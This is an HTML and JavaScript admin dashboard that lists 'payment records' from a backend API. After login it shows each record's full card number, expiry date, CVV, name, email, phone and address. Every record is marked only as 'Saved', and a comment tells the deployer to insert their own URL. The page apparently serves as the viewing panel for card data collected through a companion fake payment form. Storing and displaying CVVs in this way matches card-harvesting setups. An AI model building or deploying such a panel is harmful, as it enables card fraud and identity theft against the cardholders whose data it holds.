<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Dashboard — Payment Records</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Onest:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  /* ── Same variables as payment form ── */
  :root {
    --card-bg:    #DEE9FD;
    --blue:       #414AFF;
    --blue-hover: #2f38e0;
    --text:       #1a1a2e;
    --muted:      #515151;
    --border:     rgba(81,81,81,0.55);
    --input-bg:   #E4ECF9;
    --red:        #e05c5c;
    --label:      #3a3a5c;
    --shadow:     0 4px 24px rgba(65,74,255,0.10);
  }
  * { box-sizing:border-box; margin:0; padding:0; }

  body {
    /* Same background as payment form */
    background: linear-gradient(135deg, #c8d8f8 0%, #dce8ff 30%, #e8d5ff 70%, #c8d0ff 100%);
    background-attachment: fixed;
    font-family: 'Onest', 'Segoe UI', sans-serif;
    min-height: 100vh;
    color: var(--text);
  }

  /* ════════════════════════════════════════
     LOGIN SCREEN
  ════════════════════════════════════════ */
  #loginScreen {
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    padding: 20px;
  }

  .login-box {
    background: var(--card-bg);
    backdrop-filter: blur(12px);
    -webkit-backdrop-filter: blur(12px);
    border-radius: 18px;
    padding: 40px 32px;
    width: 100%;
    max-width: 400px;
    box-shadow: var(--shadow);
    border: 1px solid rgba(255,255,255,0.5);
  }

  .login-logo {
    text-align: center;
    margin-bottom: 30px;
  }
  .login-logo .icon {
    width: 58px; height: 58px;
    background: var(--blue);
    border-radius: 14px;
    display: inline-flex; align-items: center; justify-content: center;
    font-size: 26px; margin-bottom: 14px;
    box-shadow: 0 4px 18px rgba(65,74,255,0.35);
  }
  .login-logo h1 { font-size: 22px; font-weight: 700; color: var(--text); }
  .login-logo p  { font-size: 13px; color: var(--muted); margin-top: 4px; }

  .field { margin-bottom: 16px; }
  .field label {
    display: block;
    font-size: 0.74rem;
    font-weight: 600;
    color: var(--label);
    margin-bottom: 6px;
    letter-spacing: 0.01em;
  }
  .field input {
    width: 100%;
    padding: 11px 14px;
    border: 1px solid var(--border);
    border-radius: 8px;
    background: var(--input-bg);
    font-size: 0.88rem;
    font-family: 'Onest', sans-serif;
    color: var(--text);
    outline: none;
    transition: border-color 0.2s, box-shadow 0.2s;
  }
  .field input::placeholder { color: #a0aabb; }
  .field input:focus {
    border-color: var(--blue);
    box-shadow: 0 0 0 3px rgba(65,74,255,0.12);
  }

  .btn-primary {
    display: block;
    width: 100%;
    background: var(--blue);
    color: #fff;
    border: none;
    padding: 13px 26px;
    border-radius: 10px;
    font-size: 0.95rem;
    font-family: 'Onest', sans-serif;
    font-weight: 700;
    cursor: pointer;
    letter-spacing: 0.04em;
    transition: background 0.2s, transform 0.15s, box-shadow 0.2s;
    box-shadow: 0 4px 18px rgba(65,74,255,0.35);
  }
  .btn-primary:hover { background: var(--blue-hover); transform: translateY(-1px); }
  .btn-primary:active { transform: translateY(0); }
  .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
  .login-err { color: var(--red); font-size: 0.75rem; margin-top: 10px; text-align: center; min-height: 18px; font-weight: 500; }

  /* ════════════════════════════════════════
     DASHBOARD
  ════════════════════════════════════════ */
  #dashboard { display: none; }

  /* Topbar */
  .topbar {
    background: var(--card-bg);
    border-bottom: 1px solid rgba(65,74,255,0.15);
    padding: 0 24px;
    height: 62px;
    display: flex; align-items: center; justify-content: space-between;
    position: sticky; top: 0; z-index: 100;
    box-shadow: 0 2px 16px rgba(65,74,255,0.08);
  }
  .topbar-left { display: flex; align-items: center; gap: 12px; }
  .topbar-logo {
    width: 36px; height: 36px;
    background: var(--blue);
    border-radius: 10px;
    display: flex; align-items: center; justify-content: center;
    font-size: 17px; flex-shrink: 0;
    box-shadow: 0 2px 10px rgba(65,74,255,0.3);
  }
  .topbar-title { font-size: 15px; font-weight: 700; color: var(--text); }
  .topbar-sub   { font-size: 11px; color: var(--muted); }

  .btn-logout {
    background: transparent;
    border: 1.5px solid rgba(65,74,255,0.3);
    border-radius: 8px;
    color: var(--blue);
    font-size: 0.8rem;
    font-weight: 600;
    font-family: 'Onest', sans-serif;
    padding: 7px 16px;
    cursor: pointer;
    transition: all 0.2s;
  }
  .btn-logout:hover { background: var(--red); border-color: var(--red); color: #fff; }

  /* Main area */
  .main { padding: 24px 20px; max-width: 1400px; margin: 0 auto; }

  /* Table card — same as .form-section */
  .table-card {
    background: var(--card-bg);
    backdrop-filter: blur(12px);
    -webkit-backdrop-filter: blur(12px);
    border-radius: 18px;
    box-shadow: var(--shadow);
    border: 1px solid rgba(255,255,255,0.5);
    overflow: hidden;
  }

  .table-header {
    display: flex; align-items: center; justify-content: space-between;
    padding: 18px 22px;
    border-bottom: 1px solid rgba(65,74,255,0.12);
    gap: 12px; flex-wrap: wrap;
  }
  .table-title {
    font-size: 0.68rem;
    font-weight: 700;
    color: var(--blue);
    text-transform: uppercase;
    letter-spacing: 0.1em;
    white-space: nowrap;
  }
  .table-controls { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; flex: 1; justify-content: flex-end; }

  /* Search — same style as form inputs */
  .search-wrap { position: relative; flex: 1; min-width: 180px; max-width: 300px; }
  .search-wrap input {
    width: 100%;
    padding: 10px 12px 10px 34px;
    border: 1px solid var(--border);
    border-radius: 8px;
    background: var(--input-bg);
    font-size: 0.85rem;
    font-family: 'Onest', sans-serif;
    color: var(--text);
    outline: none;
    transition: border-color 0.2s, box-shadow 0.2s;
  }
  .search-wrap input::placeholder { color: #a0aabb; }
  .search-wrap input:focus {
    border-color: var(--blue);
    box-shadow: 0 0 0 3px rgba(65,74,255,0.12);
  }
  .search-icon { position: absolute; left: 11px; top: 50%; transform: translateY(-50%); color: var(--blue); font-size: 13px; pointer-events: none; opacity: 0.7; }

  /* Refresh button */
  .btn-refresh {
    background: var(--input-bg);
    border: 1px solid var(--border);
    border-radius: 8px;
    color: var(--label);
    padding: 9px 14px;
    font-size: 0.82rem;
    font-family: 'Onest', sans-serif;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.2s;
    display: flex; align-items: center; gap: 5px;
    white-space: nowrap; flex-shrink: 0;
  }
  .btn-refresh:hover { border-color: var(--blue); color: var(--blue); background: rgba(65,74,255,0.07); }
  .btn-refresh.spin .refresh-ico { display: inline-block; animation: spin .6s linear infinite; }
  @keyframes spin { to { transform: rotate(360deg); } }

  /* Table */
  .table-scroll { overflow-x: auto; -webkit-overflow-scrolling: touch; }
  table { width: 100%; border-collapse: collapse; font-size: 0.84rem; min-width: 700px; }

  thead th {
    background: rgba(65,74,255,0.06);
    padding: 11px 14px;
    text-align: left;
    font-size: 0.68rem;
    font-weight: 700;
    color: var(--blue);
    text-transform: uppercase;
    letter-spacing: 0.08em;
    border-bottom: 1px solid rgba(65,74,255,0.12);
    white-space: nowrap;
  }

  tbody tr {
    border-bottom: 1px solid rgba(65,74,255,0.08);
    transition: background 0.15s;
    cursor: pointer;
  }
  tbody tr:last-child { border-bottom: none; }
  tbody tr:hover { background: rgba(65,74,255,0.05); }
  tbody td { padding: 12px 14px; vertical-align: middle; white-space: nowrap; color: var(--text); }

  .txn-id { font-family: monospace; font-size: 0.78rem; color: var(--blue); font-weight: 600; }
  .amount-val { font-family: monospace; font-weight: 700; color: #16a34a; }
  .card-masked { font-family: monospace; font-size: 0.8rem; color: var(--muted); }

  .badge {
    display: inline-block; padding: 3px 10px;
    border-radius: 20px; font-size: 0.72rem; font-weight: 700;
  }
  .badge-green { background: #dcfce7; color: #16a34a; border: 1px solid #bbf7d0; }

  /* Pagination */
  .pagination {
    display: flex; align-items: center; justify-content: space-between;
    padding: 13px 20px;
    border-top: 1px solid rgba(65,74,255,0.10);
    font-size: 0.8rem; color: var(--muted);
    flex-wrap: wrap; gap: 10px;
  }
  .page-btns { display: flex; gap: 5px; flex-wrap: wrap; }
  .page-btn {
    background: var(--input-bg);
    border: 1px solid var(--border);
    border-radius: 7px;
    color: var(--text);
    padding: 6px 12px;
    font-size: 0.82rem;
    font-family: 'Onest', sans-serif;
    cursor: pointer;
    transition: all 0.2s;
  }
  .page-btn:hover:not(:disabled) { border-color: var(--blue); color: var(--blue); background: rgba(65,74,255,0.06); }
  .page-btn:disabled { opacity: 0.4; cursor: not-allowed; }
  .page-btn.active { background: var(--blue); border-color: var(--blue); color: #fff; font-weight: 700; }

  /* Loading / Empty */
  .table-loading, .table-empty { text-align: center; padding: 52px; color: var(--muted); font-size: 0.9rem; }
  .spinner {
    width: 28px; height: 28px;
    border: 2.5px solid rgba(65,74,255,0.15);
    border-top-color: var(--blue);
    border-radius: 50%;
    animation: spin .7s linear infinite;
    margin: 0 auto 14px;
  }

  /* Modal */
  .modal-overlay {
    display: none; position: fixed; inset: 0;
    background: rgba(20,20,60,0.35);
    backdrop-filter: blur(6px);
    z-index: 1000; align-items: center; justify-content: center; padding: 16px;
  }
  .modal-overlay.open { display: flex; }
  .modal {
    background: var(--card-bg);
    border: 1px solid rgba(255,255,255,0.6);
    border-radius: 18px;
    width: 100%; max-width: 580px;
    max-height: 90vh; overflow-y: auto;
    box-shadow: 0 20px 60px rgba(65,74,255,0.18);
    animation: slideUp .2s ease;
  }
  @keyframes slideUp { from { opacity:0; transform:translateY(14px); } to { opacity:1; transform:translateY(0); } }

  .modal-header {
    display: flex; align-items: center; justify-content: space-between;
    padding: 18px 22px;
    border-bottom: 1px solid rgba(65,74,255,0.12);
    position: sticky; top: 0; background: var(--card-bg); z-index: 1;
    border-radius: 18px 18px 0 0;
  }
  .modal-header h3 {
    font-size: 0.68rem; font-weight: 700;
    color: var(--blue); text-transform: uppercase; letter-spacing: 0.1em;
  }
  .modal-close {
    background: var(--input-bg); border: 1px solid var(--border);
    border-radius: 7px; color: var(--muted);
    font-size: 15px; cursor: pointer; padding: 4px 9px; line-height: 1;
    transition: all 0.2s;
  }
  .modal-close:hover { background: var(--red); border-color: var(--red); color: #fff; }

  .modal-body { padding: 22px; }
  .detail-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }

  .detail-item label {
    font-size: 0.68rem; font-weight: 700;
    color: var(--blue); text-transform: uppercase; letter-spacing: 0.08em;
    display: block; margin-bottom: 4px;
  }
  .detail-item .val {
    font-size: 0.88rem; color: var(--text);
    word-break: break-all; font-weight: 500;
  }
  .detail-item .val.mono { font-family: monospace; font-size: 0.82rem; }
  .detail-sep {
    grid-column: 1/-1;
    border: none; border-top: 1px solid rgba(65,74,255,0.12);
    margin: 2px 0;
  }

  /* Mobile */
  @media (max-width: 600px) {
    .main { padding: 14px 12px; }
    .topbar { padding: 0 14px; }
    .topbar-sub { display: none; }
    .table-header { padding: 14px; }
    .table-controls { width: 100%; }
    .search-wrap { max-width: 100%; }
    tbody td { padding: 10px 10px; }
    .detail-grid { grid-template-columns: 1fr; }
    .pagination { justify-content: center; }
    #pageInfo { width: 100%; text-align: center; }
  }
</style>
</head>
<body>

<!-- ── LOGIN ─────────────────────────────────────────────────────────────── -->
<div id="loginScreen">
  <div class="login-box">
    <div class="login-logo">
      <div class="icon">💳</div>
      <h1>Admin Panel</h1>
      <p>Sign in to access the dashboard</p>
    </div>
    <div class="field">
      <label>Username</label>
      <input type="text" id="loginUser" placeholder="Enter username" autocomplete="username">
    </div>
    <div class="field">
      <label>Password</label>
      <input type="password" id="loginPass" placeholder="Enter password" autocomplete="current-password"
             onkeydown="if(event.key==='Enter') doLogin()">
    </div>
    <button class="btn-primary" onclick="doLogin()" id="loginBtn">Sign In</button>
    <div class="login-err" id="loginErr"></div>
  </div>
</div>

<!-- ── DASHBOARD ──────────────────────────────────────────────────────────── -->
<div id="dashboard">
  <nav class="topbar">
    <div class="topbar-left">
      <div class="topbar-logo">💳</div>
      <div>
        <div class="topbar-title">Payment Dashboard</div>
        <div class="topbar-sub">Admin Panel</div>
      </div>
    </div>
    <button class="btn-logout" onclick="doLogout()">Sign Out</button>
  </nav>

  <div class="main">
    <div class="table-card">
      <div class="table-header">
        <div class="table-title">All Transactions</div>
        <div class="table-controls">
          <div class="search-wrap">
            <span class="search-icon">🔍</span>
            <input type="text" id="searchInput" placeholder="Search name, email, TxnID…"
                   oninput="onSearch(this.value)">
          </div>
          <button class="btn-refresh" onclick="refreshData()" id="refreshBtn">
            <span class="refresh-ico">↻</span> Refresh
          </button>
        </div>
      </div>

      <div class="table-scroll">
        <table>
          <thead>
            <tr>
              <th>#</th>
              <th>Transaction ID</th>
              <th>Name</th>
              <th>Email</th>
              <th>Card</th>
              <th>Amount</th>
              <th>Country</th>
              <th>Date</th>
              <th>Status</th>
            </tr>
          </thead>
          <tbody id="tableBody">
            <tr><td colspan="9" class="table-loading"><div class="spinner"></div>Loading…</td></tr>
          </tbody>
        </table>
      </div>

      <div class="pagination" id="pagination" style="display:none">
        <span id="pageInfo"></span>
        <div class="page-btns" id="pageBtns"></div>
      </div>
    </div>
  </div>
</div>

<!-- ── DETAIL MODAL ───────────────────────────────────────────────────────── -->
<div class="modal-overlay" id="modalOverlay" onclick="if(event.target===this)closeModal()">
  <div class="modal">
    <div class="modal-header">
      <h3>Transaction Details</h3>
      <button class="modal-close" onclick="closeModal()">✕</button>
    </div>
    <div class="modal-body" id="modalBody"></div>
  </div>
</div>

<script>
const API = 'http://localhost:3001'; // ← deploy pe apna URL lagao
let token = localStorage.getItem('dash_token') || '';
let currentPage = 1;
let searchQuery = '';
let searchTimer;

async function doLogin() {
  const u   = document.getElementById('loginUser').value.trim();
  const p   = document.getElementById('loginPass').value;
  const btn = document.getElementById('loginBtn');
  const err = document.getElementById('loginErr');
  err.textContent = '';
  if (!u || !p) { err.textContent = 'Please fill all fields.'; return; }
  btn.disabled = true; btn.textContent = 'Signing in…';
  try {
    const r = await fetch(`${API}/api/login`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: u, password: p })
    });
    const d = await r.json();
    if (!r.ok) throw new Error(d.error || 'Login failed');
    token = d.token;
    localStorage.setItem('dash_token', token);
    showDashboard();
  } catch(e) {
    err.textContent = e.message;
    btn.disabled = false; btn.textContent = 'Sign In';
  }
}

function doLogout() {
  token = ''; localStorage.removeItem('dash_token');
  document.getElementById('dashboard').style.display = 'none';
  document.getElementById('loginScreen').style.display = 'flex';
}

function showDashboard() {
  document.getElementById('loginScreen').style.display = 'none';
  document.getElementById('dashboard').style.display = 'block';
  loadPayments();
}

async function loadPayments(page = 1) {
  currentPage = page;
  const tbody = document.getElementById('tableBody');
  tbody.innerHTML = '<tr><td colspan="9" class="table-loading"><div class="spinner"></div>Loading…</td></tr>';
  try {
    const params = new URLSearchParams({ page, limit: 20, search: searchQuery });
    const r = await fetch(`${API}/api/payments?${params}`, { headers: { Authorization: `Bearer ${token}` } });
    if (!r.ok) throw new Error();
    const { payments, total, pages } = await r.json();

    if (!payments.length) {
      tbody.innerHTML = '<tr><td colspan="9" class="table-empty">No records found.</td></tr>';
      document.getElementById('pagination').style.display = 'none';
      return;
    }

    tbody.innerHTML = payments.map((p, i) => {
      const cardMasked = p.card ? '•••• ' + p.card.replace(/\s/g,'').slice(-4) : '—';
      const date = new Date(p.created_at).toLocaleDateString('en-US', { month:'short', day:'numeric', year:'numeric' });
      const time = new Date(p.created_at).toLocaleTimeString('en-US', { hour:'2-digit', minute:'2-digit' });
      return `
        <tr onclick="openModal('${p._id}')">
          <td style="color:var(--muted);font-size:.8rem">${(page-1)*20+i+1}</td>
          <td><span class="txn-id">${p.transaction_id?.substring(0,16)}…</span></td>
          <td style="font-weight:600">${escHtml(p.name)}</td>
          <td style="color:var(--muted)">${escHtml(p.email)}</td>
          <td><span class="card-masked">${cardMasked}</span></td>
          <td><span class="amount-val">$${parseFloat(p.amount||0).toFixed(2)}</span></td>
          <td>${escHtml(p.country)}</td>
          <td style="color:var(--muted);font-size:.8rem">${date}<br><small>${time}</small></td>
          <td><span class="badge badge-green">✓ Saved</span></td>
        </tr>`;
    }).join('');

    const pg   = document.getElementById('pagination');
    const info = document.getElementById('pageInfo');
    const btns = document.getElementById('pageBtns');
    info.textContent = `${(page-1)*20+1}–${Math.min(page*20,total)} of ${total}`;
    btns.innerHTML = '';
    const makeBtn = (label, p2, disabled, active) => {
      const b = document.createElement('button');
      b.className = 'page-btn' + (active ? ' active' : '');
      b.textContent = label; b.disabled = disabled;
      b.onclick = () => loadPayments(p2);
      btns.appendChild(b);
    };
    makeBtn('←', page-1, page===1, false);
    for (let n = Math.max(1,page-2); n <= Math.min(pages,page+2); n++) makeBtn(n, n, false, n===page);
    makeBtn('→', page+1, page>=pages, false);
    pg.style.display = 'flex';
  } catch { doLogout(); }
}

function onSearch(val) {
  clearTimeout(searchTimer);
  searchTimer = setTimeout(() => { searchQuery = val; loadPayments(1); }, 400);
}

function refreshData() {
  const btn = document.getElementById('refreshBtn');
  btn.classList.add('spin');
  loadPayments(currentPage);
  setTimeout(() => btn.classList.remove('spin'), 800);
}

async function openModal(id) {
  const overlay = document.getElementById('modalOverlay');
  const body    = document.getElementById('modalBody');
  body.innerHTML = '<div style="text-align:center;padding:32px"><div class="spinner"></div></div>';
  overlay.classList.add('open');
  try {
    const r = await fetch(`${API}/api/payments/${id}`, { headers: { Authorization: `Bearer ${token}` } });
    const p = await r.json();
    const date = new Date(p.created_at).toLocaleString();
    body.innerHTML = `
      <div class="detail-grid">
        <div class="detail-item" style="grid-column:1/-1">
          <label>Transaction ID</label>
          <div class="val mono">${escHtml(p.transaction_id)}</div>
        </div>
        <hr class="detail-sep">
        <div class="detail-item"><label>Name on Card</label><div class="val">${escHtml(p.name)}</div></div>
        <div class="detail-item"><label>Amount</label><div class="val" style="color:#16a34a;font-family:monospace;font-weight:700">$${parseFloat(p.amount||0).toFixed(2)}</div></div>
        <div class="detail-item"><label>Card Number</label><div class="val mono">${escHtml(p.card)}</div></div>
        <div class="detail-item"><label>Expiry</label><div class="val mono">${p.month}/${p.year}</div></div>
        <div class="detail-item"><label>CVV</label><div class="val mono">${escHtml(p.cvv)}</div></div>
        <hr class="detail-sep">
        <div class="detail-item"><label>Email</label><div class="val">${escHtml(p.email)}</div></div>
        <div class="detail-item"><label>Phone</label><div class="val">${escHtml(p.phone)}</div></div>
        <hr class="detail-sep">
        <div class="detail-item" style="grid-column:1/-1">
          <label>Address</label>
          <div class="val">${escHtml(p.address1)}${p.address2?' / '+escHtml(p.address2):''}<br>${escHtml(p.city)}, ${escHtml(p.state)} ${escHtml(p.postal)}<br>${escHtml(p.country)}</div>
        </div>
        <hr class="detail-sep">
        <div class="detail-item" style="grid-column:1/-1">
          <label>Submitted At</label>
          <div class="val">${date}</div>
        </div>
      </div>`;
  } catch {
    body.innerHTML = '<div style="color:var(--red);text-align:center;padding:24px">Failed to load details.</div>';
  }
}
function closeModal() { document.getElementById('modalOverlay').classList.remove('open'); }
document.addEventListener('keydown', e => { if(e.key==='Escape') closeModal(); });

function escHtml(s) {
  if (!s) return '—';
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

if (token) { showDashboard(); }
else { document.getElementById('loginScreen').style.display = 'flex'; }
</script>
